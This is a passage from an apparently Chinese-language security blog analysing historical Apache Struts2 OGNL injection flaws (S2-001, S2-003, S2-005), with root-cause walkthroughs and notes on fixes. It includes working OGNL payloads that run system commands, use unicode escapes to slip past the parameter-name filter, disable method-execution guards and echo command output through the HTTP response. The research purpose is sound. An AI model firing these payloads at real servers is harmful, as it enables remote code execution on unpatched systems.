class=md-nav__list> <li class=md-nav__item> <a href=#poc_7 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#9-s2-015 class=md-nav__link> 9. S2-015 </a> <nav class=md-nav aria-label="9. S2-015"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_8 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#10-s2-016 class=md-nav__link> 10. S2-016 </a> <nav class=md-nav aria-label="10. S2-016"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_9 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#11-s2-019 class=md-nav__link> 11. S2-019 </a> <nav class=md-nav aria-label="11. S2-019"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_10 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#12-s2-029s2-036 class=md-nav__link> 12. S2-029/S2-036 </a> <nav class=md-nav aria-label="12. S2-029/S2-036"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_11 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#s2-029 class=md-nav__link> 修复S2-029 </a> </li> <li class=md-nav__item> <a href=#13-s2-032s2-033s2-037 class=md-nav__link> 13. S2-032/S2-033/S2-037 </a> <nav class=md-nav aria-label="13. S2-032/S2-033/S2-037"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_12 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#s2-032s2-033 class=md-nav__link> S2-032/S2-033修复 </a> </li> <li class=md-nav__item> <a href=#s2-037 class=md-nav__link> S2-037修复 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 一个有意思的地方 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#14-s2-045s2-046 class=md-nav__link> 14. S2-045/S2-046 </a> <nav class=md-nav aria-label="14. S2-045/S2-046"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_13 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 修复 </a> </li> <li class=md-nav__item> <a href=#15-s2-048 class=md-nav__link> 15. S2-048 </a> </li> <li class=md-nav__item> <a href=#16-s2-052 class=md-nav__link> 16. S2-052 </a> <nav class=md-nav aria-label="16. S2-052"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_14 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#17-s2-053 class=md-nav__link> 17. S2-053 </a> <nav class=md-nav aria-label="17. S2-053"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_15 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#18-s2-055 class=md-nav__link> 18. S2-055 </a> </li> <li class=md-nav__item> <a href=#19-s2-057 class=md-nav__link> 19. S2-057 </a> <nav class=md-nav aria-label="19. S2-057"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_16 class=md-nav__link> POC </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x03 class=md-nav__link> 0x03 总结 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/wh1t3p1g/edit/master/docs/blog/2020/talk_about_struts2.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg> </a> <nav class=md-tags> <a href=../../../.#java class=md-tag> java </a> </nav> <h1>struts2历史漏洞分析</h1> <h2 id=0x00>0x00 前言</h2> <hr> <p>17年的时候整理过struts2相关的POC，时隔3年，虽然struts2已经不再那么流行了，但是还是有很大的研究价值，本文将一点一点跟一下struts2 有价值的漏洞XD</p> <h2 id=0x01>0x01 基础</h2> <hr> <p>struts2 源码下载https://archive.apache.org/dist/struts/source/</p> <p>struts2工作流程 https://blog.csdn.net/snow_7/article/details/51513381</p> <p>ognl表达式https://www.cnblogs.com/renchunxiao/p/3423299.html</p> <p>struts2 技术内幕 第6章 OGNL</p> <p>struts2漏洞的产生通OGNL表达式的执行有很大的关联，历史上很多版本的漏洞，都是因为不安全的用户输入流转到了<code>Ognl.getValue</code>、<code>Ognl.setValue</code>而导致的OGNL表达式的计算。后文不对Ognl后续的内容做分析</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=c1>// 调用静态函数 执行命令</span><span class=w></span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a><span class=n>Ognl</span><span class=p>.</span><span class=na>getValue</span><span class=p>(</span><span class=s>&quot;@java.lang.Runtime@getRuntime().exec(&#39;open /Applications/Calculator.app/&#39;)&quot;</span><span class=p>,</span><span class=w> </span><span class=n>context</span><span class=p>);</span><span class=w></span>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=n>Ognl</span><span class=p>.</span><span class=na>setValue</span><span class=p>(</span><span class=s>&quot;(\&quot;@java.lang.Runtime@getRuntime().exec(\&#39;open /System/Applications/Calculator.app/\&#39;)\&quot;)(bla)(bla)&quot;</span><span class=p>,</span><span class=n>context</span><span class=p>,</span><span class=s>&quot;&quot;</span><span class=p>);</span><span class=w></span>
</code></pre></div> <p>更多用法看http://commons.apache.org/proper/commons-ognl/language-guide.html</p> <p>其中关于<code>setValue</code>的利用用的是Expression Evaluation部分，<code>(1)(2)(3)</code>中<code>(1)(2)</code>被作为一个整体解析，对于<code>(1)</code>做表达式的解析，如果你用<code>getValue((1)(2))</code>会发现其实也能执行命令，而<code>setValue((1)(2)(3))</code>需要double evaluation，实际上变成<code>((1)(2))(3)</code>，在后续调用<code>setValueBody</code>函数时取出的<code>children[0]</code>就是<code>(1)(2)</code>，等同于调用<code>Ognl.getValue((1)(2))</code>的效果。所以这里调用<code>setValue</code>也同样可以达成<code>getValue</code>的计算OGNL表达式的效果。</p> <p><img alt=image-20200506154002054 src=/images/talk_about_struts2/image-20200506154002054.png></p> <p>同样，我们也可以利用<code>children[1]</code>的位置，如<code>(1)((2)(3))</code>把payload放到<code>(2)(3)</code></p> <p>关于<code>setValue</code>函数的另一种利用方法S2-009的方式<code>a[(1)(2)]</code>，其中<code>(1)(2)</code>后续会单独拿出来被当作OGNL表达式执行。</p> <h2 id=0x02>0x02 历史版本回顾</h2> <hr> <h3 id=1-s2-001>1. <a href=https://cwiki.apache.org/confluence/display/WW/S2-001>S2-001</a></h3> <p>参考：https://xz.aliyun.com/t/2044</p> <p>漏洞产生原因在于：用<code>&lt;s:textfield&gt;</code>标签，原样返回用户输入时，会过一次OGNL表达式的解析执行。比如场景登陆的地方，用户名密码校验错误，不跳转页面，直接将用户名和密码放到页面解析后返回。</p> <p>source: 使用了<code>s:textfield</code>标签用于表单生成，当用户输入不合法时，将用户的输入内容渲染到返回的页面上</p> <p>sink: jsp渲染调用<code>doEndTag</code>，后续由于识别出用户输入中OGNL表达式而调用<code>Ognl.getValue</code></p> <h4 id=_1>漏洞分析</h4> <p>主要出问题的是JSP中<code>&lt;s:textfield&gt;</code>标签，Struts2里处理textfield的是<code>org.apache.struts2.components.UIBean</code></p> <p><img alt=image-20200428211153680 src=/images/talk_about_struts2/image-20200428211153680.png></p> <p><img alt=image-20200428212308880 src=/images/talk_about_struts2/image-20200428212308880.png></p> <p>看到在处理params时，当parameters里不存在<code>value</code>这个key的时候，会进到执行name相对应的value上来。并且<code>altSyntax</code>默认配置为<code>true</code></p> <p><img alt=image-20200428213206168 src=/images/talk_about_struts2/image-20200428213206168.png></p> <p>会在当前的<code>name</code>左右加上OGNL表达式的标识<code>%{name}</code>，这里的name是<code>&lt;s:textfield name="name"</code>，name字段的值，比如这里<code>name="username"</code>，此时会变成<code>%{username}</code>.继续往下跟</p> <p><img alt=image-20200428220429903 src=/images/talk_about_struts2/image-20200428220429903.png></p> <p><img alt=image-20200428220447992 src=/images/talk_about_struts2/image-20200428220447992.png></p> <p>这里的String类型的转化主要用了<code>TextParesUtil.translateVariables()</code>来处理，这里看看具体他怎么做的</p> <p><code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97</code></p> <p><img alt=image-20200428221026617 src=/images/talk_about_struts2/image-20200428221026617.png></p> <p>这里会去判断传入的expression是否是OGNL表达式的格式的<code>%{xxx}</code>，如果是的话，就会去<code>OgnlValueStack</code>里面去找对应的内容(这块就是OGNL表达式的计算结果，<code>findValue</code>函数后续会去调用<code>OgnlUtil.getValue</code>，详细的可以看我基础里列的文章)</p> <p>所以这里我们第一遍传入的<code>%{name}</code>会解析获得对应的值<code>%{@java.lang.Runtime.....}</code></p> <p>第二遍会去解析<code>%{@java.lang.Runtime....}</code>，这里执行了我们想要执行的命令。</p> <h4 id=poc>回显POC</h4> <p>前面简单用了OGNL表达式调用静态方法的形式来执行系统命令<code>@java.lang.Runtime@getRuntime().exec(command)</code></p> <p>这里S2-001其实是会直接回显的，将替换原有的input标签的内容，这里换一种方式来进行回显，利用Struts2的HttpServletResponse来写入内容。</p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a>#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>#writer.println(xxxxxx),
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a>#writer.flush(),
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a>#writer.close()
</code></pre></div> <p>先从上下文context中取出<code>HttpServletResponse</code>的实例，用到的实际是<code>HttpServletResponseWrapper</code></p> <p><img alt=image-20200428223750035 src=/images/talk_about_struts2/image-20200428223750035.png></p> <p>然后获取当前response的writer对象，在利用该writer来写入任意内容</p> <p>比如</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a>%{#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()}
</code></pre></div> <p>当然你也可以替换成执行命令后的内容</p> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>#is=#pb.getInputStream(),
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>#isr=new InputStreamReader(#is),
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>#br=new BufferedReader(#isr),
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>#chars=new char[500],
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a>#br.read(#chars),
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a>#str=new java.lang.String(#chars),
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a>// 上面主要获取执行后的内容，下面主要做回显操作
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a>#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a>#writer.println(#str),
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a>#writer.flush(),
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a>#writer.close()
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a>
<a id=__codelineno-3-14 name=__codelineno-3-14 href=#__codelineno-3-14></a>%{#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()}
</code></pre></div> <h4 id=_2>修复</h4> <p>在&gt;=2.0.9版本的struts2上，<code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables</code>做了循环判断，不允许递归执行OGNL表达式</p> <p><img alt=image-20200428231900257 src=/images/talk_about_struts2/image-20200428231900257.png></p> <p>默认<code>maxLoopCount</code>为1，所以处理完<code>%{name}</code>后，不会再继续对他的值进行OGNL表达式的执行了。</p> <h3 id=2-s2-003>2. <a href=https://cwiki.apache.org/confluence/display/WW/S2-003>S2-003</a></h3> <p>影响范围：2.0.0 - 2.0.11.2</p> <p>看官网的介绍，问题出在<code>ParametersInterceptor</code>，前面利用了<code>Ognl.getValue</code>来计算OGNL表达式，而S2-003用的则是<code>Ognl.setValue</code>，该函数也同样可以计算OGNL表达式</p> <p>source: 参数的key，使用unicode编码绕过<code>#</code>的检测</p> <p>sink: 调用<code>Ognl.setValue</code></p> <h4 id=_3>漏洞分析</h4> <p>Struts2在处理参数内容时，将调用<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>函数，填充到OgnlVauleStack的context上下文里。</p> <p><img alt=image-20200430155156109 src=/images/talk_about_struts2/image-20200430155156109.png></p> <p>这里会先过一次<code>acceptableName</code>的检查（2.0.8版本）</p> <p><img alt=image-20200430155231489 src=/images/talk_about_struts2/image-20200430155231489.png></p> <p>不能出现<code>=</code>、<code>,</code>、<code>#</code>、<code>:</code>以及被排除在外的参数名</p> <p><img alt=image-20200430155418664 src=/images/talk_about_struts2/image-20200430155418664.png></p> <p>只有通过了acceptableName函数的检查才能继续往下走，所以我们必须绕过上面的几个问题，这里漏洞发现者用了unicode编码来绕过检测。</p> <p><code>ognl.JavaCharStream#readChar</code></p> <p><img alt=image-20200430232206989 src=/images/talk_about_struts2/image-20200430232206989.png></p> <p>当遇到<code>\u</code>unicode编码，会做一次转换，比如<code>\u0040</code>会被转成<code>@</code></p> <p>而<code>acceptableName</code>函数并没有考虑unicode编码的方式，导致其形同虚设。</p> <p>回到<code>setParameters</code>，后续调用了<code>OgnlValueStack.setValue</code></p> <p><img alt=image-20200430232635455 src=/images/talk_about_struts2/image-20200430232635455.png></p> <p>这里最终到了<code>OgnlUtil.setValue</code>计算OGNL表达式</p> <h4 id=poc_1>POC分析</h4> <p>来看一个调用命令执行的POC</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=p>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>)(</span><span class=n>bla</span><span class=p>)</span><span class=o>&amp;</span><span class=p>(</span><span class=err>&#39;\</span><span class=n>u0040java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>Runtime</span><span class=nd>@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>\&#39;</span><span class=n>open</span><span class=w> </span><span class=o>/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>\</span><span class=sc>&#39;)&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>)(</span><span class=n>bla</span><span class=p>)</span><span class=w></span>
</code></pre></div> <p>先来看第一句，该条ognl表达式用于开启方法执行，因为在调用<code>setParameters</code>之前，开发人员考虑到了参数执行OGNL表达式的风险，所以提前关闭了函数调用执行</p> <p><img alt=image-20200430234629782 src=/images/talk_about_struts2/image-20200430234629782.png></p> <p>设置完了之后，再还原回来</p> <p>但是OGNL表达式对于上下文的内容是可控的，我们可以在进行函数调用前，将context里的<code>xwork.MethodAccessor.denyMethodExecution</code>设为<code>false</code>， 这样第二句poc就可以执行函数调用了。</p> <p>所以在发送这两条POC时，需要控制好设置false在前，执行在后（ascii排序，可以看回显poc的处理）</p> <p>跟前面一样，写一下回显的POC</p> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=p>(</span><span class=n>a</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=w></span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=p>(</span><span class=n>b</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023ret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>\&#39;</span><span class=n>id</span><span class=err>\</span><span class=sc>&#39;)&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w> </span><span class=c1>// 执行命令</span><span class=w></span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=p>(</span><span class=n>c</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023dis</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>u0020java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>DataInputStream</span><span class=p>(</span><span class=err>\</span><span class=n>u0023ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>())</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=p>(</span><span class=n>d</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023res</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>u0020byte</span><span class=o>[</span><span class=mi>2000</span><span class=o>]</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=p>(</span><span class=n>e</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023dis</span><span class=p>.</span><span class=na>readFully</span><span class=p>(</span><span class=err>\</span><span class=n>u0023res</span><span class=p>)</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=p>(</span><span class=n>f</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=err>\</span><span class=n>u003d</span><span class=err>\</span><span class=n>u0023context</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=err>\&#39;</span><span class=n>com</span><span class=p>.</span><span class=na>opensymphony</span><span class=p>.</span><span class=na>xwork2</span><span class=p>.</span><span class=na>dispatcher</span><span class=p>.</span><span class=na>HttpServletResponse</span><span class=err>\&#39;</span><span class=p>).</span><span class=na>getWriter</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=p>(</span><span class=n>g</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=k>new</span><span class=err>\</span><span class=n>u0020java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>(</span><span class=err>\</span><span class=n>u0023res</span><span class=p>))</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w> </span><span class=c1>// 获取response，回显数据</span><span class=w></span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=p>(</span><span class=n>h</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=p>.</span><span class=na>flush</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-5-9 name=__codelineno-5-9 href=#__codelineno-5-9></a><span class=p>(</span><span class=n>i</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023writer</span><span class=p>.</span><span class=na>close</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=w></span>
</code></pre></div> <p>这里poc的先后顺序用到了第一个位置，实际的ognl表达式放到了第二个位置<code>(1)((2)(3))</code></p> <h4 id=_4>修复</h4> <p>xwork&gt;=2.0.6 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>多了以下代码</p> <p><img alt=image-20200507101610804 src=/images/talk_about_struts2/image-20200507101610804.png></p> <p>低版本用的直接是已存在的OgnlValueStack，从2.0.6开始，使用了一个空的stack来处理参数的解析</p> <p>并且从这个版本开始多了SecurityMemberAccess，用来限制ognl表达式中函数调用</p> <p>在<code>ognl.OgnlRuntime#callAppropriateMethod</code>调用函数前，会去判断函数是否可被访问(method不为null)</p> <p><img alt=image-20200507102155210 src=/images/talk_about_struts2/image-20200507102155210.png></p> <p>其实这边<code>isMethodAccessible</code>的返回结果无所谓，但是不能在这个函数调用时出错，出错的话也就走不到<code>invokeMethod</code></p> <p>看一下具体的实现，<code>isMethodAccessible</code>的判断依赖于<code>SecurityMemberAccess</code></p> <p><img alt=image-20200507102334789 src=/images/talk_about_struts2/image-20200507102334789.png></p> <p><img alt=image-20200507103428140 src=/images/talk_about_struts2/image-20200507103428140.png></p> <p>这里我们主要看<code>isAcceptableProperty</code></p> <p><img alt=image-20200507103621957 src=/images/talk_about_struts2/image-20200507103621957.png></p> <p><img alt=image-20200507103632321 src=/images/talk_about_struts2/image-20200507103632321.png></p> <p><img alt=image-20200507103642250 src=/images/talk_about_struts2/image-20200507103642250.png></p> <p>下端点调试你会发现这个版本acceptProperties为空，而excludeProperties非空，所以在调用<code>isExclude</code>函数时，正则调用<code>pattern.matcher(null)</code>会报错，也就无法达到调用函数的目的了（<code>propertiesName</code>为null）。</p> <p>所以如果要绕过这个版本的限制，首先需要解决的是这个函数的报错问题，看S2-005</p> <h3 id=3-s2-005>3. <a href=https://cwiki.apache.org/confluence/display/WW/S2-005>S2-005</a></h3> <p>影响版本：struts2.0.0 - 2.1.8.1</p> <p>S2-005为S2-003的修复绕过，直接分析POC</p> <h4 id=poc_2>POC分析</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=p>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=p>.</span><span class=na>excludeProperties</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.util.Collections@EMPTY_SET</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>)(</span><span class=n>bla</span><span class=p>)</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=p>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>)(</span><span class=n>bla</span><span class=p>)</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=p>(</span><span class=err>&#39;\</span><span class=n>u0040java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>Runtime</span><span class=nd>@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>\&#39;</span><span class=n>open</span><span class=err>\</span><span class=n>u0020</span><span class=o>/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>\</span><span class=sc>&#39;)&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>)(</span><span class=n>bla</span><span class=p>)</span><span class=w></span>
</code></pre></div> <p>前面S2-003修复部分说到了需要绕过<code>isAcceptableProperty</code>函数报错的问题才能继续往下进行函数调用。</p> <p>从代码上看，只要<code>excludeProperties</code>和<code>acceptProperties</code>为空，就不会进到正则匹配的环节，所以需要将他们置为空</p> <p>poc里的第一行做的就是这个事情，将<code>excludeProperties</code>置为空集合</p> <p>这里看一下为什么以<code>#_memberAccess</code>的方式可以访问到<code>OgnlContext</code>对象的<code>memberAccess</code>属性</p> <p><code>ognl.OgnlContext#get</code></p> <p><img alt=image-20200507110201209 src=/images/talk_about_struts2/image-20200507110201209.png></p> <p>从<code>OgnlContext</code>上下文获取内容，首先会判断是否在<code>RESERVED_KEYS</code>集合里，如果存在，则相应的调用他的getters，如果不存在，则从当前的上下文里去找这个key。</p> <p>所以<code>#_memeberAccess</code>实际获取的是<code>OgnlContext</code>的<code>memeberAccess</code>属性内容</p> <p>还有出现变化的地方，由于现在context里是没有response对象可以获取的，所以在处理回显的时候我们需要找另外的方法</p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=p>(</span><span class=n>a</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=p>.</span><span class=na>excludeProperties</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.util.Collections@EMPTY_SET</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a><span class=p>(</span><span class=n>a</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a><span class=p>(</span><span class=n>b</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023ret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>\&#39;</span><span class=n>id</span><span class=err>\</span><span class=sc>&#39;)&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w> </span><span class=c1>// 执行命令</span><span class=w></span>
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a><span class=p>(</span><span class=n>c</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023dis</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>u0020java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>DataInputStream</span><span class=p>(</span><span class=err>\</span><span class=n>u0023ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>())</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a><span class=p>(</span><span class=n>d</span><span class=p>)((</span><span class=err>&#39;\</span><span class=n>u0023res</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>u0020byte</span><span class=o>[</span><span class=mi>2000</span><span class=o>]</span><span class=err>&#39;</span><span class=p>)(</span><span class=n>bla</span><span class=p>))</span><span class=o>&amp;</span><span class=w></span>
